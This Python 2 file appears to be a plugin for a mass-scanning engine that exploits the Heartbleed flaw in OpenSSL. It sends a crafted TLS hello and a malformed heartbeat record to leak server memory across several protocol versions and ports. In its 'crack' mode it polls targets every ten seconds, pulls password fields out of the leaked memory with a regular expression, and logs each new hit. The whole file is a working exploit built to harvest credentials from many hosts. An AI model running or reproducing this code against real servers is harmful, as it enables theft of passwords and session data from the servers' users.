from task import *
import socket, struct, time
import select, re

def h2bin(x):
    return x.replace(' ', '').replace('\n', '').decode('hex')

def create_hello(version):
    hello = h2bin('16 ' + version + ' 00 dc 01 00 00 d8 ' + version + ''' 53
43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
00 0f 00 01 01
''')
    return hello

def create_hb(version):
    hb = h2bin('18 ' + version + ' 00 03 01 40 00')
    return hb

def hexdump(s):
    for b in xrange(0, len(s), 16):
        lin = [c for c in s[b : b + 16]]
        hxdat = ' '.join('%02X' % ord(c) for c in lin)
        pdat = ''.join((c if 32 <= ord(c) <= 126 else '.' )for c in lin)
        print '  %04x: %-48s %s' % (b, hxdat, pdat)
    print
    
def recvall(s, length, timeout=5):
    endtime = time.time() + timeout
    rdata = ''
    remain = length
    while remain > 0:
        rtime = endtime - time.time() 
        if rtime < 0:
            return None
        r, w, e = select.select([s], [], [], 5)
        if s in r:
            data = s.recv(remain)
            # EOF?
            if not data:
                return None
            rdata += data
            remain -= len(data)
    return rdata

def recvmsg(s):
    hdr = recvall(s, 5)
    if hdr is None:
        #print 'Unexpected EOF receiving record header - server closed connection'
        return None, None, None
    typ, ver, ln = struct.unpack('>BHH', hdr)
    pay = recvall(s, ln, 10)
    if pay is None:
        #print 'Unexpected EOF receiving record payload - server closed connection'
        return None, None, None
    #print ' ... received message: type = %d, ver = %04x, length = %d' % (typ, ver, len(pay))
    return typ, ver, pay

def get_prints(s):
    prints = ''
    sp_cnt = 0
    for c in s:
        if 32 <= ord(c) <= 126:
            if sp_cnt > 0:
                prints += ' '
                sp_cnt = 0
            prints += c
        else:
            sp_cnt += 1

    return prints

def hit_hb(s, version):
    s.send(create_hb(version))    
    typ, ver, pay = recvmsg(s)   
    if typ == 24 and len(pay) > 3:       
        return get_prints(pay)
        
    return None

class sslhb_plugin(engine_plugin):
    strip_set = set()
    
    def __init__(self, name):
        engine_plugin.__init__(self, name)
        
    def post_init(self):
        try:
            self.load_log_dict(self.get_cfg_vaule(None, "load_log"))
        except:
            pass
    
    def load_log_dict(self, logname):        
        for line in open(logname, 'r'):
            key = line.split('\t')[5].replace('\n', '')
            self.strip_set.add(key)
        
    def process_sslhb(self, ip, port, filter):
        try:
            for version in ('03 00', '03 01','03 02','03 03'):
                sock = socket.create_connection((ip, int(port)), 4)
                if sock:
                    sock.send(create_hello(version))
                    while True:
                        typ, ver, pay = recvmsg(sock)
                        if typ == None:
                             break
                         
                        # Look for server hello done message. 0x0E SERVER HELLO DONE
                        if typ == 22 and ord(pay[0]) == 0x0E:
                            s = hit_hb(sock, version)
                            if s:
                                if not filter:
                                    return s
                                
                                m = re.search(filter, s);
                                if m:
                                    return m.group(0)
                                
                                return None
                                
                    sock.close()
        except:
            pass
    
    def handle_task(self, task_info):
        ip =  socket.inet_ntoa(struct.pack("L", socket.htonl(task_info['work'])))
        
        print "\r>>%s\t" % ip,
        
        #init plugin vars
        is_crack = 0
        filter = None
        ports = ['443']
        
        try:
            is_crack = int(self.get_cfg_vaule(task_info, "crack"))
            ports = self.get_cfg_vaule(task_info, "ports").split(" ")            
        except:
            pass
        
        if is_crack:
            filter = "([^=;&]+)[&;]*\s*pass\w*=(.+?)[;&\s]"
            
        while True:
            result = None
            for port in self.get_cfg_vaule(task_info, "ports").split(" "):
                result = self.process_sslhb(ip, port, filter)
                if result and not is_crack:
                    self.log(task_info, "%s\t%s\t%s" % (ip, port, result))
                    return
                
            if not is_crack:
                break
            
            if result and not result in self.strip_set:
                self.strip_set.add(result)
                self.log(task_info, "%s\t%s\t%s" % (ip, port, result))
                
            time.sleep(10)
            
def init_plugin(name):
    return sslhb_plugin(name)

